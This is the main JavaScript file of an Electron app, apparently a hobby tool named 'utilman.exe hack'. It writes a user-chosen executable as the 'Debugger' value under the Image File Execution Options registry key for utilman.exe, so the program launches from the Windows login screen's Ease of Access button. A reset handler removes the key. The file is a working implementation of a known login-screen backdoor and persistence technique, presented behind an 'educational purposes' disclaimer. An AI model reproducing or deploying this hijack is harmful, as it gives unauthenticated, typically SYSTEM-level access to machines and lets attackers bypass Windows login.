// Imports
const { app, BrowserWindow, dialog, Menu, ipcMain } = require('electron');
const Registry = require('winreg');
const UpdateManager = new (require('./Managers/UpdateManager'))('The0Show/utilman-hack', '1.1.0')

let mainWindow;

app.on('ready', async () => {
    const aaaa = {
        type: 'warning',
        buttons: ['OK', 'Contact The0Show'],
        defaultId: 0,
        title: `Disclaimer`,
        detail: "This program was made for educational/entertainment purposes. The creator of this program and it's contributors will not be responible for any damage caused by this program. If you have any questions/concerns, please contact The0Show.",
    }
        
    const response = dialog.showMessageBoxSync(null, aaaa)

    if(response === 1){
        require('electron').shell.openExternal('http://the0show.com/contact')
    }

    const updatecheck = await UpdateManager.CheckForUpdates()

    if(!updatecheck[0]){
        const options = {
            type: 'info',
            buttons: ['Yes', 'No'],
            defaultId: 0,
            title: `Update`,
            message: `Version "${updatecheck[2]}" is now available!`,
            detail: `Version "${updatecheck[2]}" is now available. Would you like to install it?`,
        }
            
        const response = dialog.showMessageBoxSync(null, options)
        if(response === 0){
            require('electron').shell.openExternal(updatecheck[3])
    
            app.quit(0)
        }
    }

    mainWindow = new BrowserWindow({
        resizable: false,
        maximizable: false,
        fullscreenable: false,
        center: true,
        webPreferences: {
            preload: `${__dirname}/src/js/index.js`,
        }
    });

    var dev = Menu.buildFromTemplate([
        {
            label: 'Development', 
            submenu: [
                { role: 'reload' },
                { role: 'forceReload' },
                { role: 'toggleDevTools' },
                { type: 'separator' },
                { role: 'resetZoom' },
                { role: 'zoomIn' },
                { role: 'zoomOut' },
                { type: 'separator' },
                { role: 'togglefullscreen' }
            ]
        }
    ])

    // If the app is not packaged, show the dev menu. If it is packaged, and the "--dev" flag is in use, show the dev menu. Otherwise, don't show the dev menu.
    if(app.isPackaged && !process.argv.includes('--dev')) Menu.setApplicationMenu(null);
    if(!app.isPackaged || process.argv.includes('--dev')) Menu.setApplicationMenu(dev);

    mainWindow.setTitle('utilman.exe hack');
    mainWindow.loadURL(`file://${__dirname}/src/index.html`);
    mainWindow.setIcon('./icon.ico')
});

ipcMain.on('selectEXE', async (event, arg) => {
    const opendialog = await dialog.showOpenDialog(null, {
        title: "Please select the application you want to be able to access on the login screen.",
        filters: [
            {
                name: "Application",
                extensions: ['exe']
            }
        ],
        properties: ['openFile', 'dontAddToRecent']
    });

    
    mainWindow.webContents.send('returnFilePaths', opendialog.filePaths[0]);
});

ipcMain.on('applyRegedit', async (event, arg) => {
    const utilman = new Registry({
        hive: Registry.HKLM,
        key:  '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe'
    });

    utilman.create((err) => {
        if(err) throw err
    });

    utilman.set("Debugger", "REG_SZ", arg, (err) => {
        if(err) throw err
    });

    dialog.showMessageBox(null, {
        type: 'info',
        buttons: ['OK'],
        defaultId: 0,
        title: `Success!`,
        message: `The registry was successfully editied.`,
        detail: `To launch your chosen program, click on the "Ease of Access" button on the login screen.`,
    });
})

ipcMain.on('resetKey', async (event, arg) => {
    const utilman = new Registry({
        hive: Registry.HKLM,
        key:  '\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe'
    });

    utilman.destroy((err) => {});

    dialog.showMessageBox(null, {
        type: 'info',
        buttons: ['OK'],
        defaultId: 0,
        title: `Success!`,
        message: `The registry was successfully editied.`,
        detail: `The "Ease of Access" button on the login screen has been reset, and will launch the original program.`,
    });
});